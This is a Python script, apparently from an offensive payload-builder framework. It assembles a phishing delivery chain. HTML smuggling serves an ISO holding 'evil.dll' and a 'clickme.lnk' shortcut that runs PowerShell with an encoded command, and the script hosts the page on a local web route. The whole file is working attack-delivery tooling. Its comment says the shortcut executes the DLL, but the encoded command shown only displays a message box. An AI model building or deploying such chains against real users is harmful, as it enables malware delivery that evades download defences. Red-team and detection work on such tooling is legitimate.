from make.htmlsmuggling.htmlsmuggling import makeHtmlSmuggling
from make.lnk.lnk import makeLnk
from make.iso.iso import makeIso
from make.powershell.powershell import *
from make.zip.zip import makeZip
from make.vbs.vbs import *
from make.mshta.mshta import *
from make.onenote.onenote import *
from make.bat.bat import *

from helpers import readFileContent, saveAceFile, makeAceFile
from model import AceFile, AceRoute
from web import serve


def recipe_1():
    # HTML Smuggling -> ISO -> ( LNK -> Powershell:Load&Exec <- DLL )

    # DLL
    dllData: AceBytes = readFileContent('payloads/evil.dll')
    dllFile: AceFile = makeAceFile('evil.dll', dllData)

    psMsgbox: AceStr = makePowershellMessageBox()
    # LNK to powershell.exe to execute DLL
    execData: AceStr = makePowershellEncodedCommand(
        input=psMsgbox,
    )
    lnkData: AceBytes = makeLnk(
        name = "clickme.lnk",
        target = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        arguments = "-noexit -EncodedCommand {}".format(execData),
    )
    lnkFile: AceFile = makeAceFile('clickme.lnk', lnkData)

    # Pack DLL and LNK into ISO
    container: AceBytes = makeIso(
        files = [
            dllFile,
            lnkFile,
        ],
    )
    containerFile: AceFile = makeAceFile('test.iso', container)

    # HTML to serve ISO
    html: AceStr = makeHtmlSmuggling(
        containerFile,
    )

    # serve HTML
    serveHtml: AceRoute = AceRoute('/test', html)
    serve([serveHtml])
